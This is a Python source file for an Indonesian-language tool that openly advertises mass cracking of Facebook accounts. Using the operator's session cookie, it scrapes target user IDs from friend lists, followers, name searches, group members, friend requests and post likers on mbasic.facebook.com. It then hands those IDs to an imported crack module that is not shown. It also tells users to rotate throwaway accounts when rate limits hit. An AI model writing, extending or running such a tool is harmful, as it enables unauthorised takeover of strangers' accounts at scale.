# coding:utf-8

from modul import *
from ajg.login import login
from .ngewe import crack as cracking
from .ngewe import gadag_user as asu
import itertools,os,sys,time,datetime


M = '\x1b[1;31m'
U = '\x1b[1;36m'
P = '\x1b[1;37m'
H = '\x1b[1;32m'
K = '\x1b[1;33m'
m = '\x1b[0;31m'
u = '\x1b[0;36m'
p = '\x1b[0;37m'
h = '\x1b[0;32m'
k = '\x1b[0;33m'

url="https://mbasic.facebook.com"
longentod="lo lebih ngentod"
ip = requests.get('https://api.ipify.org').text
logo=("\n"+H+" ╦═╗╔═╗╦ ╦   ╔═╗╔═╗╔═╗╦╔═╗╦╔═╗╦  \n ╠╦╝║ ║╚╦╝───║ ║╠╣ ╠╣ ║║  ║╠═╣║  \n ╩╚═╚═╝ ╩    ╚═╝╚  ╚  ╩╚═╝╩╩ ╩╩═╝\n "+P+"[#]------------------------------------------------ \n [*] Coded by	: "+H+"Roy Octa Firdaus \n "+P+"[*] Facebook	: "+H+"facebook.com/jbfbold \n "+P+"[*] Whatsapp	: "+H+"081318306972  \n \x1b[1;97m[#]------------------------------------------------ \n [*] Status	:"+M+" Tidak Premium "+P+"\n [*] Alamat IP	:"+H+" "+ip+" ")


def ajg():
	os.system("python saya_gans/romrom/romi/licenrom.py")
	
	
def tik():
    titik = [
     '   ']
    for o in titik:
        print ('\r\x1b[1;97m\n [•] Mohon Tunggu & Bersabar... \n [•] Sedang memeriksa Status '+H+'Premium '+P+'Anda... '+H+'>_< ' + o),
        sys.stdout.flush()
        time.sleep(6)
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.02)
def prem():
	os.system ('clear')
	jalan(P+' ['+H+'*'+P+'] Status	: '+M+'Tidak Premium '+P+'Maaf')
	time.sleep(3)
        
        
class awokawokawok:
	def __init__(self):
		
		self.cek_folder()
		self.semua=open("cookies/info.txt").read()
		self.jonson=json.loads(self.semua)
		self.cookies=self.jonson["cookies"]
		self.main_menu()
		
	def cek_folder(self):
		if os.path.exists("result") is False: os.mkdir("result")
		if os.path.exists("cookies") is False: os.mkdir("cookies")
		if os.path.exists("result/live.txt") is False: open("result/live.txt","a")
		if os.path.exists("result/chek.txt") is False: open("result/chek.txt","a")
		if os.path.exists("cookies/info.txt") is False:
			os.system("clear")
			print("\n"+p+"["+H+"*"+P+"] Hallo dunia👋 selamat datang :)")
			print(p+"["+H+"*"+P+"] Sebuah tools untuk mengCrack akun facebook (Hacking secara massal/acak) ")
			print(p+"["+H+"*"+P+"] Supaya tools ini dapat di gunakan silahkan masukan cookies facebook anda! ")
			print(p+"["+H+"*"+P+"] "+m+"Script ini tidak untuk di perjualbelikan!,hubungi whatsap ku jika ada yg jual script ini!")
			print(p+"["+H+"*"+P+"] "+h+"Whatsapp"+p+" : "+h+"081318306972 ")
			print (p+"[#]------------------------------------------------")
			cookie=input("\n"+P+" ["+H+"?"+P+"] cookies :"+K+" ")
			while cookie in (""," "):
				print (M+' [!] Isi yang benar')
				cookie=input("\n"+P+" ["+H+"?"+P+"] cookies :"+K+" ")
			login(url,{"cookie":cookie})
			
	
	def cek_cookies(self):
		global url
		try: respon=req.get(f"{url}/profile.php",cookies=self.cookies)
		except koneksi_error: exit(M+" [!] Tidak ada koneksi")
		if "mbasic_logout_button" not in respon.text:
			try: os.remove("cookies/info.txt");os.remove("cookies/token.txt")
			except: os.system("rm -rf cookies/info.txt && rm -rf cookies/token.txt")
			exit(M+" [!] cookie invalid, harap login ulang")
		url=url.replace("mbasic","free") if "free.facebook" in respon.url else url
		os.system("clear")
	
	#def logo_banner(self):
		#os.system ('clear')
		#print('\n'+H+' ╦═╗╔═╗╦ ╦   ╔═╗╔═╗╔═╗╦╔═╗╦╔═╗╦  \n ╠╦╝║ ║╚╦╝───║ ║╠╣ ╠╣ ║║  ║╠═╣║  \n ╩╚═╚═╝ ╩    ╚═╝╚  ╚  ╩╚═╝╩╩ ╩╩═╝\n '+P+'[#]------------------------------------------------ \n ['+K+'*'+P+'] Coded by	: '+H+'Roy Octa Firdaus \n '+P+'['+K+'*'+P+'] Facebook	: '+H+'facebook.com/jbfbold \n '+P+'['+K+'*'+P+'] Whatsapp	: '+H+'081318306972  \n \x1b[1;97m[#]------------------------------------------------  ')
		#print(P+' ['+H+'*'+P+'] Alamat IP	:'+H+' '+ip)
		#print(52*'\x1b[1;97m═')
		
	
	def main_menu(self):
		global longentod
		self.cek_cookies()
		takeuser=asu(url,self.cookies)
		tik()
		prem()
		os.system ('clear')
		ip = requests.get('https://api.ipify.org').text
		print('\n'+H+' ╦═╗╔═╗╦ ╦   ╔═╗╔═╗╔═╗╦╔═╗╦╔═╗╦  \n ╠╦╝║ ║╚╦╝───║ ║╠╣ ╠╣ ║║  ║╠═╣║  \n ╩╚═╚═╝ ╩    ╚═╝╚  ╚  ╩╚═╝╩╩ ╩╩═╝\n '+P+'[#]------------------------------------------------ \n ['+K+'*'+P+'] Coded by	: '+H+'Roy Octa Firdaus \n '+P+'['+K+'*'+P+'] Facebook	: '+H+'facebook.com/jbfbold \n '+P+'['+K+'*'+P+'] Whatsapp	: '+H+'081318306972  \n \x1b[1;97m[#]------------------------------------------------  ')
		jalan(P+' ['+K+'*'+P+'] Status	:'+M+' Tidak Premium ')
		time.sleep(0.2)
		print(P+' ['+K+'*'+P+'] Alamat IP	:'+H+' '+ip)
		time.sleep(0.2)
		print(52*'\x1b[1;97m═')
		time.sleep(0.2)
		#print(f" [*] UID  : {self.jonson['uid']}")
		print(f"\x1b[1;97m [ Hallo \x1b[1;92m{self.jonson['nama']}\x1b[1;97m ]")
		#print(f" [*] User Name : {self.jonson['username']}\n" if self.jonson["username"] is not None else "")
		print(52*'\x1b[1;97m═')
		print(P+" ["+K+"01"+P+"] Crack Teman")
		print(P+" ["+K+"02"+P+"] Crack dari Teman Publik")
		print(P+" ["+K+"03"+P+"] Crack dari Followers")
		print(P+" ["+K+"04"+P+"] Crack dari Pencarian Nama Publik")
		print(P+" ["+K+"05"+P+"] Crack Anggota Group")
		print(P+" ["+K+"06"+P+"] Crack dari Permintaan Pertemanan")
		print(P+" ["+K+"07"+P+"] Crack dari Like Postingan")
		print(P+" ["+H+"08"+P+"] Upgrade ke "+H+"Premium")
		print(P+" ["+M+"09"+P+"] "+M+"Hapus/Ganti "+p+"Cookie")
		print(P+" ["+M+"00"+P+"] "+M+"Keluar")
		print(52*'\x1b[1;97m═')
		
		pilih=input(P+' ['+H+'?'+P+'] Pilih :'+K+' ')
		while pilih in (""," "):
			print ('\x1b[1;91m [!] Isi yang benar')
			pilih=input(P+' ['+H+'?'+P+'] Pilih >'+K+' ')
			
		if pilih in ("3","03"):
			os.system ('clear')
			print (logo)
			print(52*'\x1b[1;97m═')
			print (P+" [*] Masukkan Username/ID Facebook ")
			user=input(P+" [?] User ID :"+K+" ")
			while user in (""," "):
				print ('\x1b[1;91m [!] Isi yang benar')
				user=input(P+" [?] User ID :"+K+" ")
			usek=f"{url}/profile.php?id={user}&v=followers" if user.isdigit() else f"{url}/{user}?v=followers"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi !")
			if "Halaman Tidak Ditemukan" in respon or "Konten Tidak Ditemukan" in respon:
				kembali(f"\x1b[1;91m [!] Pengguna {user} tidak ditemukan" if user.isdigit() else f"\x1b[1;91m [!] Pengguna {user} tidak ditemukan",self.main_menu)
			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
				kembali("\x1b[1;91m [!] Maaf limit, silahkan ganti akun tumbal Anda",self.main_menu)
			else:
				print(P+" [*] Nama Akun :"+H+" "+parser(respon,"html.parser").find("title").text)
				longentod=takeuser.followers(respon)
			
		elif pilih in ("1","01"):
			os.system ('clear')
			print (logo)
			print(52*'\x1b[1;97m═')
			print (" [*] Crack daftar teman facebook anda sendiri")
			try: respon=req.get(f"{url}/me/friends",cookies=self.cookies).text
			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi !")
			if "Tidak Ada Teman Untuk Ditampilkan" in respon:
				kembali("\x1b[1;91 [!] tidak ada teman",self.main_menu)
			longentod=takeuser.fl(respon)
			
		elif pilih in ("5","05"):
			os.system ('clear')
			print (logo)
			print(52*'\x1b[1;97m═')
			print ('\x1b[1;97m [!] Pastikan anda sudah bergabung dengan grup ')
			user=input(P+" ["+H+"?"+P+"] Id group :"+K+" ")
			while user in (""," "):
				print ('\x1b[1;91m [!] Isi yang benar')
				user=input(P+" ["+H+"?"+P+"] ID Group :"+K+" ")
			usek=f"{url}/browse/group/members/?id={user}"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi !")
			if "Halaman Tidak Ditemukan" in respon or "Konten Tidak Ditemukan" in respon:
				kembali(f"\x1b[1;91m [!] id grup {user} tidak di temukan",self.main_menu)
			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
				kembali("\x1b[1;91m [!] Maaf limit, silahkan ganti akun tumabl Anda",self.main_menu)
			else:
				#batas=input(P+" ["+H+"?"+P+"] Jumlah :\x1b[1;93m ")
				#while batas.isdigit() is False:
					#print ("\x1b[1;91m [!] Isi yang benar" if batas in (""," ") else ""+M+"[!] harus berupa angka")
					#batas=input(P+" ["+H+"?"+P+"] jumlah :\x1b[1;93m ")
				print(P+" ["+H+"*"+P+"] Nama Group :\x1b[1;32m "+parser(respon,"html.parser").find("title").text[8:])
				longentod=takeuser.grup(respon,user)
				#longentod=takeuser.grup(respon,int(batas))
				
		elif pilih in ("4","04"):
			os.system ('clear')
			print (logo)
			print(52*'\x1b[1;97m═')
			print(P+" [*] Contoh Nama :"+H+" Sugiono ")
			user=input(P+" ["+H+"?"+P+"] Nama :"+K+" ")
			while user in (""," "):
				print ('\x1b[1;91m [!] Isi yang benar')
				user=input(P+" ["+H+"?"+P+"] Nama :"+K+" ")
			usek=f"{url}/search/people/?q={user}"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi !")
			if "Maaf, kami tidak menemukan" in respon:
				kembali(f" \x1b[1;91m[!] dengan nama {user} tidak ditemukan",self.main_menu)
			else:
				jumlah=input(P+" ["+H+"?"+P+"] Jumlah :"+K+" ")
				while jumlah.isdigit() is False:
					print ("\x1b[1;91m [!] Isi yang benar" if jumlah in (""," ") else " ! harus berupa angka")
					jumlah=input(P+" ["+H+"?"+P+"] Jumlah :"+K+" ")
				longentod=takeuser.cari(respon,int(jumlah))
			
		elif pilih in ("2","02"):
			os.system ('clear')
			print (logo)
			print(52*'\x1b[1;97m═')
			print (P+" [*] Masukkan Username/ID Facebook ")
			user=input(P+" ["+H+"?"+P+"] User ID :"+K+" ")
			while user in (""," "):
				print ('\x1b[1;91m [!] Isi yang benar')
				user=input(P+" ["+H+"?"+P+"] User ID :"+K+" ")
			usek=f"{url}/profile.php?id={user}&v=friends" if user.isdigit() else f"{url}/{user}/friends"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi !")
			if "Tidak Ada Teman Untuk Ditampilkan" in respon:
				kembali("\x1b[1;91m [!] daftar teman tidak di publik",self.main_menu)
			if "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
				kembali("\x1b[1;91m [!] Maaf limit, silahkan ganti akun tumbal Anda",self.main_menu)
			if "Konten Tidak Ditemukan" in respon or "Halaman yang Anda minta tidak ditemukan." in respon:
				kembali(f" \x1b[1;91m[!] ID {user} tidak ditemukan" if user.isdigit() else f" ! pengguna dengan username {user} tidak ditemukan",self.main_menu)
			else:
				print(" \x1b[1;97m["+H+"*"+P+"] Target Name :"+H+" "+parser(respon,"html.parser").find("title").text)
				longentod=takeuser.fl(respon)
			
		elif pilih in ("6","06"):
			os.system ('clear')
			print (logo)
			print(52*'\x1b[1;97m═')
			print(' [*] Di acc ajg kalau ada yg kirim pertemanan-_ ')
			try: respon=req.get(f"{url}/friends/center/requests/#friends_center_main",cookies=self.cookies).text
			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi !")
			if "Tidak Ada Permintaan" in respon:
				kembali(" \x1b[1;91m[!] tidak ada permintaan pertemanan",self.main_menu)
			longentod=takeuser.request(respon)
			
		elif pilih in ("7","07"):
			os.system ('clear')
			print (logo)
			print(52*'\x1b[1;97m═')
			print (P+" ["+H+"*"+P+"] Masukkan Link/ID Postingan ")
			user=input(" ["+H+"?"+P+"] Url/Id Post :"+K+" ")
			while user in (""," "):
				print ("\x1b[1;91m [!] Isi yang benar")
				user=input(" ["+H+"?"+P+"] Url/ID Post :"+K+" ")
			if user.isdigit():
				user=f"{url}/{user}"
			else:
				try: asyu=re.search("https://(.*?)\.facebook\.com/",user).group(1)
				except AttributeError: exit(" \x1b[1;91m[!] masukkan url postingan dengan benar")
				user=url+user.split(f"https://{asyu}.facebook.com")[1]
			try: respon=req.get(user,cookies=self.cookies).text
			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi ")
			if "Halaman yang diminta tidak bisa ditampilkan sekarang." in respon:
				kembali(" \x1b[1;91m[!] postingan tidak ditemukan",self.main_menu)
			try:
				ufi=re.search('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',respon).group(1).replace(";","&")
				respon=req.get(f"{url}/ufi/reaction/profile/browser/{ufi}",cookies=self.cookies).text
				if "Semua 0" in respon or "Orang yang menanggapi" not in respon:
					kembali(" \x1b[1;91m[!] tidak ada yang menanggapi postingan",self.main_menu)
				jumlah=input("\x1b[1;97m ["+H+"?"+P+"] jumlah :\x1b[1;93m ")
				while jumlah.isdigit() is False:
					print(" \x1b[1;91m[!] Isi yang benar" if jumlah in (""," ") else " ! harus berupa angka")
					jumlah=input(" \x1b[1;97m[?] jumlah :\x1b[1;93m ")
				longentod=takeuser.like_post(respon,int(jumlah))
			except AttributeError: exit("\x1b[1;91m [!] error tidak diketahui")
			except koneksi_error: exit("\x1b[1;91m [!] Tidak ada koneksi")
		elif pilih in ("8","08"):
			#print(P+' [!] Mohon tunggu!')
			ajg()
		elif pilih in ("9","09"):
			try: os.remove("cookies/info.txt");os.remove("cookies/token.txt")
			except: os.system("rm -rf cookies/info.txt && rm -rf cookies/token.txt")
			exit(" \x1b[1;91m[!] Gagal menghapus cookie " if os.path.exists("cookies/info.txt") else ""+H+" [✓] sukses menghapus cookie")
		
		elif pilih in ("0","00"):
			exit("\n \x1b[1;97m["+H+"*"+P+"] Terima kasih telah menggunakan tools ini :)")
		
		else:
			kembali("\x1b[1;91m [!] Isi yang benar",self.main_menu)
		
		if longentod!="lo lebih ngentod":
			if len(longentod)!=0:
				cracking.crack(url,longentod)
			else:
				exit("\x1b[1;91m [!] Gagal mengambil id ")
		else:
			exit(" \x1b[1;91m[!] error tidak diketahui")
